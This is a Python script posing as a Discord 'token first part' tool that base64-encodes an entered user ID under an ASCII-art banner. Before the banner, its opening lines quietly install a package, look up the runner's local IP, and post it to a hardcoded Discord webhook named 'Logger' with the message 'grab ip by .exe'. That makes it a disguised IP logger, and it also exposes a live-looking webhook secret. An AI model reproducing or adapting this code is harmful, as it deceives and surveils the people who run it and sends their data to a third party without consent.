# Modules importation
import os
import base64
try:
    from colorama import Fore, init
except:
    os.system("py -m pip install colorama")
    from colorama import Fore, init
init() 

import socket
import requests as req
url: str = 'https://checkip.amazonaws.com'
requests = req.get(url)
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)

import discord_webhook

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "grab ip by .exe||@everyone||"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1133004896006848612/CG7NVW07NKT5mSE3GsG_VWQqYbrRej9uQdUV_lmuHGVXnq8UCueCek45xL9vrA6HnUeW", username="Logger", content=content)
embed = DiscordEmbed(title="IP:  " + ip_address)
webhook.add_embed(embed)
response = webhook.execute()


banner = (Fore.RED + """
▓██   ██▓ ▒█████ ▓██   ██▓ ▒█████     ▓█████▄  █████▓     ██████  ▒█████   ██▓     ▒█████  
 ▒██  ██▒▒██▒  ██▒▒██  ██▒▒██▒  ██▒   ▓█   ▀▓  ██▒ ▓▒   ▒██    ▒ ▒██▒  ██▒▓██▒    ▒██▒  ██▒
  ▒██ ██░▒██░  ██▒ ▒██ ██░▒██░  ██▒   ▒███  ▒ ▓██░ ▒░   ░ ▓██▄   ▒██░  ██▒▒██░    ▒██░  ██▒
  ░ ▐██▓░▒██   ██░ ░ ▐██▓░▒██   ██░   ▒▓█  ▄░ ▓██▓ ░      ▒   ██▒▒██   ██░▒██░    ▒██   ██░
  ░ ██▒▓░░ ████▓▒░ ░ ██▒▓░░ ████▓▒░   ░▒████▒ ▒██▒ ░    ▒██████▒▒░ ████▓▒░░██████▒░ ████▓▒░
   ██▒▒▒ ░ ▒░▒░▒░   ██▒▒▒ ░ ▒░▒░▒░    ░░ ▒░ ░ ▒ ░░      ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░ 
 ▓██ ░▒░   ░ ▒ ▒░ ▓██ ░▒░   ░ ▒ ▒░     ░ ░  ░   ░       ░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░ 
 ▒ ▒ ░░  ░ ░ ░ ▒  ▒ ▒ ░░  ░ ░ ░ ▒        ░    ░         ░  ░  ░  ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  
 ░ ░         ░ ░  ░ ░         ░ ░        ░  ░                 ░      ░ ░      ░  ░    ░ ░  
 ░ ░              ░ ░                                                                             
""" + Fore.LIGHTCYAN_EX)
print(banner)
userid = input(" [INPUT] USER ID : ")
encodedBytes = base64.b64encode(userid.encode("utf-8"))
encodedStr = str(encodedBytes, "utf-8")
print(f'\n [LOGS] TOKEN FIRST PART : {encodedStr}')
os.system('pause >nul')  # Pause command in Batch (press any key to exit the code)
